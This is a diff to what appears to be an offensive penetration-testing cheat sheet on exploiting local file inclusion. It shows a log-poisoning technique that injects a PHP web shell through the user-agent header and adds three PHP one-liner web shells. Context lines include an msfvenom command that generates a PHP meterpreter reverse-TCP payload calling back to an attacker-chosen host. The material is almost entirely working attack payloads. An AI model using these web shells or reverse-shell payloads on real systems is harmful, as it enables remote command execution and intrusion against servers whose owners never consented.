@@ -141,6 +141,7 @@ Windows
     /windows/repair/SAM
 
 Log Poisoning 
+
 	open: /log/apache2/access.log 
 	send payload as user agent string: <?php system($_GET['cmd']); ?>    
 	/log/apache2/access.log&cmd=id  
@@ -153,6 +154,11 @@ Turning LFI to RFI: https://l.avala.mp/?p=241
 
 PHP
 
+    <?php echo shell_exec($_GET['cmd']);?> 
+    <?php system($_GET['cmd']);?>
+    <?php passthru($_GET['cmd']);?>
+      
+      
     msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
     cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
